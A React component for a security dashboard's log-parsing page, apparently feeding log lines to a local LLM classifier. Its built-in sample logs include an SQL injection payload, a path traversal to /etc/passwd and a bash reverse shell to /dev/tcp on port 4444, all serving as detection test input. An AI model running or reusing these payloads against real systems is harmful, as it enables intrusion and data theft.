import { useState } from 'react';
import { Link } from 'react-router-dom';
import { useParse } from '../hooks/useParse';
import ParseResultPanel from '../components/ParseResultPanel';
import Icon from '../components/icons';
import { ErrorNote, PageHeader } from '../components/ui';

const SAMPLES = {
  'Brute force': 'Oct 22 02:14:11 fw01 kernel: DROP IN=eth0 SRC=185.220.101.45 DST=10.0.4.12 PROTO=TCP SPT=52344 DPT=3389 failed password for invalid user administrator after 42 attempts',
  SQLi: "nginx: 10.0.0.44 - GET /search?q=1' UNION SELECT username,password FROM information_schema.users -- 500",
  Traversal: 'apache: 10.1.2.3 - "GET /../../../../etc/passwd HTTP/1.1" 200',
  Shell: 'edr: process= bash -i >& /dev/tcp/198.51.100.9/4444 0>&1 user=www-data',
  Benign: 'sshd[1234]: Accepted publickey for deploy from 10.0.4.9 port 50122 ssh2',
};

export default function ParsePage() {
  const { result, loading, error, parse, reset } = useParse();
  const [rawLog, setRawLog] = useState('');
  const [source, setSource] = useState('dashboard');
  const [asyncMode, setAsyncMode] = useState(false);
  const [elapsed, setElapsed] = useState(null);

  const onSubmit = async (event) => {
    event.preventDefault();
    if (!rawLog.trim()) return;
    const started = performance.now();
    const out = await parse(rawLog, { source, asyncMode });
    setElapsed(out ? Math.round(performance.now() - started) : null);
  };

  return (
    <>
      <PageHeader
        title="Parse Log"
        subtitle="Qwen2.5-0.5B-Instruct · Outlines guided JSON · local ChromaDB retrieval"
        actions={
          <Link to="/alerts" className="btn-ghost btn-sm">
            <Icon.Inbox size={14} />
            View alerts
          </Link>
        }
      />

      <div className="grid gap-5 lg:grid-cols-2">
        <div className="space-y-4">
          <form onSubmit={onSubmit} className="card">
            <div className="card-header">
              <p className="card-title">Raw log input</p>
              <div className="flex items-center gap-1">
                {Object.keys(SAMPLES).map((k) => (
                  <button
                    key={k}
                    type="button"
                    onClick={() => setRawLog(SAMPLES[k])}
                    className="rounded-md px-1.5 py-0.5 text-[10px] text-slate-500 transition-colors hover:bg-slate-800 hover:text-cyan-300"
                  >
                    {k}
                  </button>
                ))}
              </div>
            </div>

            <div className="space-y-4 p-4">
              <div>
                <textarea
                  id="raw"
                  className="input h-44 resize-y font-mono text-xs leading-relaxed"
                  placeholder="Paste a firewall / IDS / syslog / EDR log line…"
                  value={rawLog}
                  onChange={(e) => setRawLog(e.target.value)}
                  maxLength={20000}
                  spellCheck={false}
                />
                <div className="mt-1 flex items-center justify-between text-[11px] text-slate-600">
                  <span>{rawLog.trim() ? `${rawLog.trim().split(/\s+/).length} tokens ≈` : 'No input'}</span>
                  <span className="font-mono">{rawLog.length}/20000</span>
                </div>
              </div>

              <div className="grid gap-3 sm:grid-cols-2">
                <div>
                  <label className="label" htmlFor="src">Source</label>
                  <input
                    id="src"
                    className="input"
                    value={source}
                    onChange={(e) => setSource(e.target.value)}
                    maxLength={64}
                  />
                </div>
                <label className="flex cursor-pointer items-end gap-2 pb-2 text-xs text-slate-400">
                  <input
                    type="checkbox"
                    className="h-4 w-4 rounded border-slate-600 bg-slate-900 accent-cyan-400"
                    checked={asyncMode}
                    onChange={(e) => setAsyncMode(e.target.checked)}
                  />
                  Queue on Celery worker
                </label>
              </div>

              <div className="flex gap-2">
                <button className="btn-primary flex-1" type="submit" disabled={loading || !rawLog.trim()}>
                  {loading ? (
                    <>
                      <Icon.Refresh size={14} className="animate-spin" />
                      Analysing…
                    </>
                  ) : (
                    <>
                      <Icon.Play size={14} />
                      Analyse log
                    </>
                  )}
                </button>
                <button className="btn-ghost" type="button" onClick={reset} disabled={loading}>
                  Clear
                </button>
              </div>
            </div>
          </form>

          <ErrorNote message={error} />
        </div>

        <div className="card self-start">
          <div className="card-header">
            <p className="card-title">Analysis</p>
            {elapsed !== null && <span className="font-mono text-[11px] text-slate-500">{elapsed} ms</span>}
          </div>
          <div className="p-4">
            <ParseResultPanel result={result} />
          </div>
        </div>
      </div>
    </>
  );
}
